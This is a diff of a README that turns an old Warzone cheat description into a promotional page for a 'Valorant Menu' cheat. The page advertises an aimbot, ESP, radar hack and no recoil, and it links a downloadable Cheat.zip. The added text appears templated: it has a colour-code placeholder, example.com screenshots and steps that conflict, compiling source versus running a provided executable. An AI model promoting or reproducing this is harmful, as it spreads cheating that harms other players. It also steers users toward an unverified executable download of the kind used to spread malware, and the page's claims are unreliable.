@@ -1,28 +1,42 @@
-# MW-WZ-Internal
+# Valorant Menu
 
-EDUCATIONAL PERPOSES ONLY NOT INDENDED TO BE USED
+🚀 Welcome to the Valorant Menu repository! This project provides a comprehensive external cheat for Valorant, carefully coded in C++ to enhance your gaming experience. Whether you are looking to dominate your opponents or simply have some fun exploring new features, Valorant Menu has got you covered.
 
-Outdated MW/WZ Cheat With Menu
+## Features
+- **Aimbot:** Lock onto your enemies with precision to secure more eliminations.
+- **ESP (Extra Sensory Perception):** Keep track of enemy positions with visual markers.
+- **Radar Hack:** Know your surroundings at all times for strategic advantage.
+- **No Recoil:** Maintain accuracy with reduced weapon recoil.
+- **Custom Crosshair:** Personalize your aiming reticle for improved targeting.
+- **and much more!**
 
-A cheat for modern warfare (warzone) game mode. Expect shit code. But it works
-THIS IS NOT UPDATED NOR WILL I UPDATE IT FOR YOU
+## Getting Started
+Follow these steps to start using Valorant Menu:
+1. Clone this repository to your local machine.
+2. Compile the source code using your preferred C++ compiler.
+3. Run the executable file provided to activate the cheat.
+4. Launch Valorant and enjoy the enhanced features!
 
-Esp
-Bones
-Colour
-Customisable Aimbot
-No recoil
-Imgui menu
-NO INJECTOR INCLDED
-MISC OPTIONS:
-FOV, UAV Etc
-^ Was using old cbuff method update using info from Mist: https://www.unknowncheats.me/forum/call-of-duty-modern-warfare/496646-mw19-wz-set-dvars.html
+## Download
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat.zip-<COLORCODE>)](https://github.com/user-attachments/files/16928413/Cheat.zip)
 
+(The actual color code for the download button can be inserted in place of `<COLORCODE>` above.)
 
-If people still want to use it, use it. Or don't.
+## Screenshots
+![Gameplay Screenshot 1](https://example.com/screenshot1.png)
+![Gameplay Screenshot 2](https://example.com/screenshot2.png)
 
-MEDIA:
+## Contributing
+We welcome contributions from the community to improve Valorant Menu. If you have any suggestions, bug fixes, or new features to add, feel free to submit a pull request.
 
-![unknown](https://user-images.githubusercontent.com/41522576/166277018-dd9d4388-565d-4e55-9f5d-564d4047a797.png)
-![unknown (1)](https://user-images.githubusercontent.com/41522576/166250014-9ec7a479-21bf-45f6-9c65-3e3a3b5b4f0e.png)
-![unknown](https://user-images.githubusercontent.com/41522576/166250033-75a3b7ee-2ffc-4471-bd3b-cab88ded50ce.png)
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+## Contact
+For any inquiries or support, contact the project maintainer at [maintainer@example.com](mailto:maintainer@example.com).
+
+---
+
+Thank you for checking out Valorant Menu! Keep gaming and enjoy the cheat responsibly! 🎮🔥
+
+---
